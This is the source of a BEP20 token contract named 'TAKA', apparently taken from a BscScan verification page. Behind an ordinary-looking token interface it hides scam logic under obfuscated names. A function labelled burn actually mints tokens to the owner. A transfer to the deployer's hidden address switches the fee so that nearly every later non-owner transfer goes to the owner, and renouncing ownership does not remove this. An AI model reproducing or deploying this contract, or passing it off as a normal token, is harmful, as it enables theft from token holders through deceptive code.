/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-19 08:03 GMT
 */

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract MFZTTIC {
address public owner;
uint256 private  WHPHJW = 10000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => uint256) public balanceOf;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  LTNOUW = 1000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  name = "TAKA";
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  CJXLNW = address(0);
uint256 private  IBOUJB = 100000000;
string public  symbol = "TAKA";
uint256 public constant DBGEVN = 99999;
uint256 private  NMYCLX = 10000000000000;
uint256 private  BGKYKY = 1000000000000000000;
address private  OVRKZY = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  QXWLYD = address(0);
uint256 private  IAKLLH = 1000000000000000000000;
uint256 private  NQXWFT = 1000000000000000000;
address private  IMAFMN = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint8 public constant decimals = 18;
address private  GVOVTI = address(0);
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getNQXWFT() private returns (uint256) {
return NQXWFT;
}

function _getLTNOUW() private returns (uint256) {
return LTNOUW;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getIBOUJB() private returns (uint256) {
return IBOUJB;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getNMYCLX() private returns (uint256) {
return NMYCLX;
}

function _getOVRKZY() private returns (address) {
return OVRKZY;
}

function _getCJXLNW() private returns (address) {
return CJXLNW;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "QZUDTG");
require(to != address(0), "QZUDTG");
require(amount <= balanceOf[from], "QZUDTG");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* DBGEVN/BGKYKY ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==IMAFMN){
BGKYKY = DBGEVN+2;
}
emit Transfer(from, to, transferAmount);
}
function _getIAKLLH() private returns (uint256) {
return IAKLLH;
}

constructor () {
IMAFMN = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getWHPHJW() private returns (uint256) {
return WHPHJW;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getGVOVTI() private returns (address) {
return GVOVTI;
}

function _getQXWLYD() private returns (address) {
return QXWLYD;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tQZUDTG 0");
require(spender != address(0), "fQZUDTG 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}